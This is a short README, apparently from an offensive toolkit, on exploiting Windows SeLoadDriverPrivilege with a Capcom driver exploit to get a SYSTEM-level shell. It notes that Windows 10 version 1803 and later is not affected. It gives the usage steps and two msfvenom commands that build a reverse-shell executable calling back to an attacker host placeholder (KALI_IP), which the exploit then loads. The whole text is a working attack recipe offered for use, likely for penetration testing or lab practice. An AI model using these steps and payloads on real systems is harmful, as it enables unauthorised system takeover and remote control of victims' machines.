# SeLoadDriverPrivilege

> Since Windows 10 Version 1803, the "SeLoadDriverPrivilege" is not exploitable, as it is no longer possible to include references to registry keys under "HKEY_CURRENT_USER".

## With GUI

After executing `.\ExpoitCapcom.exe` a cmd as `NT AUTHORITY\SYSTEM` will pop up


## No-GUI version

Executing `.\No-GUI\ExpoitCapcom.exe` will load the Binary `C:\ProgramData\rev.exe`, so you can send yourself a revshell with mfsvenom
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<KALI_IP> LPORT=<KALI_PORT> -f exe -o rev.exe
```
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=<KALI_PORT> -f exe -o rev.exe
```
